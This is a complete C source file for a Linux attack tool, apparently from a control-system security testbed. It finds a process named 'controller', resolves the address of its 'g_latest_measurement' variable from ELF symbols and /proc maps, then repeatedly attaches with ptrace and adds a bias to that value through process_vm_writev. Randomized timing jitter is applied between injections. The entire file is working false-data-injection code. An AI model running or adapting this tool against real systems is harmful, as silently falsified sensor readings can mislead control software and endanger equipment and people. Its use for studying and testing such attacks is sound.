#include "common.h"

#ifndef __linux__
#include <stdio.h>
int main(void) {
    fprintf(stderr, "attacker_bias only supports Linux.\n");
    return 1;
}
#else

#include <ctype.h>
#include <dirent.h>
#include <elf.h>
#include <errno.h>
#include <fcntl.h>
#include <math.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

static volatile sig_atomic_t g_stop = 0;

static void on_sigint(int signo) {
    (void)signo;
    g_stop = 1;
}

static int is_number(const char *s) {
    if (!s || *s == '\0') {
        return 0;
    }
    if (*s == '+' || *s == '-') {
        s++;
    }
    if (*s == '\0') {
        return 0;
    }
    while (*s) {
        if (!isdigit((unsigned char)*s)) {
            return 0;
        }
        s++;
    }
    return 1;
}

static pid_t find_pid_by_comm(const char *proc_name) {
    DIR *dir = opendir("/proc");
    if (!dir) {
        return -1;
    }

    struct dirent *ent = NULL;
    while ((ent = readdir(dir)) != NULL) {
        if (!isdigit((unsigned char)ent->d_name[0])) {
            continue;
        }

        pid_t pid = (pid_t)atoi(ent->d_name);
        if (pid <= 0) {
            continue;
        }

        char comm_path[128];
        snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", pid);
        FILE *fp = fopen(comm_path, "r");
        if (!fp) {
            continue;
        }

        char comm[128];
        if (!fgets(comm, sizeof(comm), fp)) {
            fclose(fp);
            continue;
        }
        fclose(fp);

        size_t len = strlen(comm);
        if (len > 0 && comm[len - 1] == '\n') {
            comm[len - 1] = '\0';
        }

        if (strcmp(comm, proc_name) == 0) {
            closedir(dir);
            return pid;
        }
    }

    closedir(dir);
    errno = ESRCH;
    return -1;
}

static int get_exe_path(pid_t pid, char *buf, size_t buflen) {
    char link_path[128];
    snprintf(link_path, sizeof(link_path), "/proc/%d/exe", pid);
    ssize_t n = readlink(link_path, buf, buflen - 1);
    if (n < 0) {
        return -1;
    }
    buf[n] = '\0';
    return 0;
}

static int resolve_module_base(pid_t pid, const char *exe_path, uintptr_t *base_out) {
    char maps_path[128];
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);

    FILE *fp = fopen(maps_path, "r");
    if (!fp) {
        return -1;
    }

    char line[1024];
    int found = 0;
    uintptr_t best_base = 0;
    while (fgets(line, sizeof(line), fp)) {
        unsigned long start = 0;
        unsigned long end = 0;
        unsigned long offset = 0;
        char perms[8] = {0};
        char dev[32] = {0};
        unsigned long inode = 0;
        char path[512] = {0};

        int n = sscanf(line, "%lx-%lx %7s %lx %31s %lu %511s",
                       &start, &end, perms, &offset, dev, &inode, path);
        if (n < 7) {
            continue;
        }
        if (strcmp(path, exe_path) != 0) {
            continue;
        }

        uintptr_t candidate = (uintptr_t)start - (uintptr_t)offset;
        if (!found) {
            best_base = candidate;
            found = 1;
        }
        if (offset == 0) {
            best_base = candidate;
            break;
        }
    }

    fclose(fp);
    if (!found) {
        errno = ESRCH;
        return -1;
    }

    *base_out = best_base;
    return 0;
}

static int lookup_symbol_value(const char *elf_path, const char *symbol_name,
                               uint64_t *sym_value, int *is_pie) {
    int fd = open(elf_path, O_RDONLY);
    if (fd < 0) {
        return -1;
    }

    Elf64_Ehdr ehdr;
    if (pread(fd, &ehdr, sizeof(ehdr), 0) != (ssize_t)sizeof(ehdr)) {
        close(fd);
        return -1;
    }
    if (memcmp(ehdr.e_ident, ELFMAG, SELFMAG) != 0 || ehdr.e_ident[EI_CLASS] != ELFCLASS64) {
        close(fd);
        errno = ENOEXEC;
        return -1;
    }

    *is_pie = (ehdr.e_type == ET_DYN);

    size_t shdr_size = (size_t)ehdr.e_shentsize * (size_t)ehdr.e_shnum;
    Elf64_Shdr *shdrs = (Elf64_Shdr *)malloc(shdr_size);
    if (!shdrs) {
        close(fd);
        return -1;
    }
    if (pread(fd, shdrs, shdr_size, (off_t)ehdr.e_shoff) != (ssize_t)shdr_size) {
        free(shdrs);
        close(fd);
        return -1;
    }

    int found = 0;
    for (int i = 0; i < ehdr.e_shnum && !found; ++i) {
        if (shdrs[i].sh_type != SHT_SYMTAB && shdrs[i].sh_type != SHT_DYNSYM) {
            continue;
        }
        if (shdrs[i].sh_entsize == 0 || shdrs[i].sh_link >= ehdr.e_shnum) {
            continue;
        }

        Elf64_Shdr str_sh = shdrs[shdrs[i].sh_link];
        char *strtab = (char *)malloc(str_sh.sh_size);
        if (!strtab) {
            continue;
        }
        if (pread(fd, strtab, str_sh.sh_size, (off_t)str_sh.sh_offset) != (ssize_t)str_sh.sh_size) {
            free(strtab);
            continue;
        }

        Elf64_Shdr sym_sh = shdrs[i];
        Elf64_Sym *syms = (Elf64_Sym *)malloc(sym_sh.sh_size);
        if (!syms) {
            free(strtab);
            continue;
        }
        if (pread(fd, syms, sym_sh.sh_size, (off_t)sym_sh.sh_offset) != (ssize_t)sym_sh.sh_size) {
            free(syms);
            free(strtab);
            continue;
        }

        size_t cnt = sym_sh.sh_size / sizeof(Elf64_Sym);
        for (size_t k = 0; k < cnt; ++k) {
            if (syms[k].st_name >= str_sh.sh_size) {
                continue;
            }
            if (syms[k].st_shndx == SHN_UNDEF) {
                continue;
            }
            const char *name = strtab + syms[k].st_name;
            if (strcmp(name, symbol_name) == 0) {
                *sym_value = syms[k].st_value;
                found = 1;
                break;
            }
        }

        free(syms);
        free(strtab);
    }

    free(shdrs);
    close(fd);

    if (!found) {
        errno = ENOENT;
        return -1;
    }
    return 0;
}

static int resolve_symbol_runtime_addr(pid_t pid, const char *symbol_name, uintptr_t *addr_out) {
    char exe_path[512];
    if (get_exe_path(pid, exe_path, sizeof(exe_path)) < 0) {
        return -1;
    }

    uint64_t sym_value = 0;
    int is_pie = 0;
    if (lookup_symbol_value(exe_path, symbol_name, &sym_value, &is_pie) < 0) {
        return -1;
    }

    if (!is_pie) {
        *addr_out = (uintptr_t)sym_value;
        return 0;
    }

    uintptr_t base = 0;
    if (resolve_module_base(pid, exe_path, &base) < 0) {
        return -1;
    }

    *addr_out = base + (uintptr_t)sym_value;
    return 0;
}

static int read_remote_double(pid_t pid, uintptr_t addr, double *out) {
    struct iovec local = {
        .iov_base = out,
        .iov_len = sizeof(*out),
    };
    struct iovec remote = {
        .iov_base = (void *)addr,
        .iov_len = sizeof(*out),
    };
    ssize_t n = process_vm_readv(pid, &local, 1, &remote, 1, 0);
    if (n != (ssize_t)sizeof(*out)) {
        return -1;
    }
    return 0;
}

static int write_remote_double(pid_t pid, uintptr_t addr, double value) {
    struct iovec local = {
        .iov_base = &value,
        .iov_len = sizeof(value),
    };
    struct iovec remote = {
        .iov_base = (void *)addr,
        .iov_len = sizeof(value),
    };
    ssize_t n = process_vm_writev(pid, &local, 1, &remote, 1, 0);
    if (n != (ssize_t)sizeof(value)) {
        return -1;
    }
    return 0;
}

static void usage(const char *prog) {
    fprintf(stderr,
            "Usage (recommended): %s <pid|auto|proc_name> <bias> [interval_ms] [rounds] [symbol] [proc_name]\n"
            "Example: %s auto 4.5 100 80 g_latest_measurement controller\n"
            "Legacy mode: %s <pid> <addr_hex> <bias> [interval_ms] [rounds]\n",
            prog, prog, prog);
}

int main(int argc, char **argv) {
    if (argc < 3) {
        usage(argv[0]);
        return 1;
    }

    int legacy_mode = (argc >= 4 && strncmp(argv[2], "0x", 2) == 0);

    pid_t pid = -1;
    uintptr_t addr = 0;
    double bias = 0.0;
    int interval_ms = 100;
    int rounds = 120;
    int jitter_ms = 20;
    const char *symbol_name = "g_latest_measurement";
    const char *proc_name = "controller";

    if (legacy_mode) {
        pid = (pid_t)strtol(argv[1], NULL, 10);
        addr = (uintptr_t)strtoull(argv[2], NULL, 16);
        bias = strtod(argv[3], NULL);
        if (argc > 4) {
            interval_ms = atoi(argv[4]);
        }
        if (argc > 5) {
            rounds = atoi(argv[5]);
        }
    } else {
        const char *target_spec = argv[1];
        bias = strtod(argv[2], NULL);
        if (argc > 3) {
            interval_ms = atoi(argv[3]);
        }
        if (argc > 4) {
            rounds = atoi(argv[4]);
        }
        if (argc > 5) {
            symbol_name = argv[5];
        }
        if (argc > 6) {
            proc_name = argv[6];
        }

        if (strcmp(target_spec, "auto") == 0) {
            pid = find_pid_by_comm(proc_name);
        } else if (is_number(target_spec)) {
            pid = (pid_t)strtol(target_spec, NULL, 10);
        } else {
            proc_name = target_spec;
            pid = find_pid_by_comm(proc_name);
        }

        if (pid <= 0) {
            perror("find target pid");
            fprintf(stderr, "Hint: ensure process name '%s' exists.\n", proc_name);
            return 1;
        }

        if (resolve_symbol_runtime_addr(pid, symbol_name, &addr) < 0) {
            perror("resolve_symbol_runtime_addr");
            fprintf(stderr,
                    "Hint: ensure symbol '%s' exists and controller binary is not stripped.\n",
                    symbol_name);
            return 1;
        }
    }

    if (pid <= 0 || addr == 0 || interval_ms <= 0 || rounds <= 0) {
        usage(argv[0]);
        return 1;
    }

    if (jitter_ms >= interval_ms) {
        jitter_ms = interval_ms / 2;
    }

    signal(SIGINT, on_sigint);
    signal(SIGTERM, on_sigint);
    srand((unsigned int)(time(NULL) ^ getpid()));

    printf("[attacker] pid=%d target_addr=0x%llx bias=%f mode=%s\n",
           pid, (unsigned long long)addr, bias, legacy_mode ? "legacy" : "resolved");

    int rounds_done = 0;
    int injections = 0;
    for (int i = 0; i < rounds && !g_stop; ++i) {
        if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
            perror("ptrace(PTRACE_ATTACH)");
            fprintf(stderr,
                    "Hint: same user + CAP_SYS_PTRACE or ptrace_scope=0 is required.\n");
            break;
        }
        if (waitpid(pid, NULL, 0) < 0) {
            perror("waitpid");
            (void)ptrace(PTRACE_DETACH, pid, NULL, NULL);
            break;
        }

        double cur = 0.0;
        if (read_remote_double(pid, addr, &cur) < 0) {
            perror("process_vm_readv");
            (void)ptrace(PTRACE_DETACH, pid, NULL, NULL);
            break;
        }

        double tampered = cur + bias;
        if (write_remote_double(pid, addr, tampered) < 0) {
            perror("process_vm_writev");
            (void)ptrace(PTRACE_DETACH, pid, NULL, NULL);
            break;
        }

        if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0) {
            perror("ptrace(PTRACE_DETACH)");
            break;
        }

        rounds_done++;
        injections++;
        printf("[attacker] round=%d old=%.6f new=%.6f\n", i, cur, tampered);

        int jitter = 0;
        if (jitter_ms > 0) {
            jitter = (rand() % (2 * jitter_ms + 1)) - jitter_ms;
        }
        int sleep_ms = interval_ms + jitter;
        if (sleep_ms < 1) {
            sleep_ms = 1;
        }
        usleep((useconds_t)sleep_ms * 1000U);
    }

    printf("[attacker] summary rounds_done=%d injections=%d\n", rounds_done, injections);
    printf("[attacker] finished.\n");
    return 0;
}

#endif
